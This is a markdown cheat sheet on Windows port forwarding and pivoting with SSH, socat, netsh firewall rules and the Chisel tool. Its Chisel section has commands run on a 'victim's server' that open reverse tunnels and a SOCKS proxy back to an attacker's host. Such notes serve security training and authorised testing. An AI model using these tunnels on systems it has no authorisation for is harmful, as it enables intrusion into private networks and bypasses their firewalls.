---
title: Windows port forwarding
---

## Port forwarding via SSH
SSH can be used to perform tunneling. Nowadays Windows is distrubuted with the OpenSSH client included by default.

### Remote port forwarding

```plaintext
   IP1                  IP2 (pivot)           IP3
|'''''''|            |'''''''|             |'''''''|
| port1 | ---------> |  SSH  | ----------> | port3 | 
|,,,,,,,|            |,,,,,,,|             |,,,,,,,|
```

```powershell
ssh <user1>@<ip1> -R <port1>:<ip3>:<port3> -N
```

Now the `ip3:port3` is available from ip1 on `user1@localhost:port1`. Port numbers don't need to match. Local port `localhost:9999` can be forwarded to the remote RDP `1.1.1.1:3389` service.

### Local port forwarding

```plaintext
   IP1                 IP2 (pivot)            IP3
|'''''''|            |'''''''|             |'''''''|
| port1 | <--------- | port2 | <---------- |,,,,,,,| 
|,,,,,,,|            |  SSH  |             
                     |,,,,,,,|
```

```powershell
ssh <user1>@<ip1> -L *:<port1>:127.0.0.1:<port2>
```

Now the `ip1:port1` is available from `ip3` via `ip2:port2`. In other words, `ip2:port2` points to `ip1:port1`.

## Port forwarding with Socat
Socat allows to forward ports in a simpler way than SSH but it have to be transfered to the pivot host.

```plaintext
   IP1                 IP2 (pivot)            IP3
|'''''''|            |'''''''|             |'''''''|
|,,,,,,,| ---------> | port2 | ----------> | port3 | 
                     |  SSH  |             |,,,,,,,|
                     |,,,,,,,|
```

Socat performs some kind of a reversed _local port forwarding_. It opens local (IP2 pivot) port. It's easier than connecting to the IP1 directly but it might require to create a firewall rule to allow any connections to the opened port.

```powershell
socat TCP4-LISTEN:<port2>,fork TCP4:<ip3>:<port3>
```

Now the `ip3:port3` is available via `ip2:port2`. To open the pivot's port:

```powershell
netsh advfirewall firewall add rule name="Open Port <port2>" dir=in action=allow protocol=TCP localport=<port2>
```

## Chisel tool
[Chisel](https://github.com/jpillora/chisel) is a swiss-knife tool (Linux and Windows) for any kind of a port forwarding.

### Reverse port-forwarding
It makes connection from the server to the attacker host.

```bash
# 1. Run on attacker's host
chisel server --reverse --port 9001

# 2. Run on victim's server (forward :local-port to :open-port)
chisel client <attacker-ip>:9001 R:<open-port>:127.0.0.1:<local-port>

# 3. Now open in browser: http://localhost:<open-port>
```

### Reverse port-forwarding using SOCKS proxy
It is useful if we want to access many ports on the victim's machine.

```bash
# 1. Run on attacker's host
chisel server --reverse --port 9001

# 2. Run on victim's server (forward socks to :open-port)
chisel client 10.0.0.1:9001 R:<open-port>:socks

# 3. Add following line in /etc/proxychains4.conf
socks5 127.0.0.1 <open-port>
```

Now you can use `proxychains` before every command to tunnel the requests to the victim's server. There is also configuration in the `Burp Suite` for that purpose.
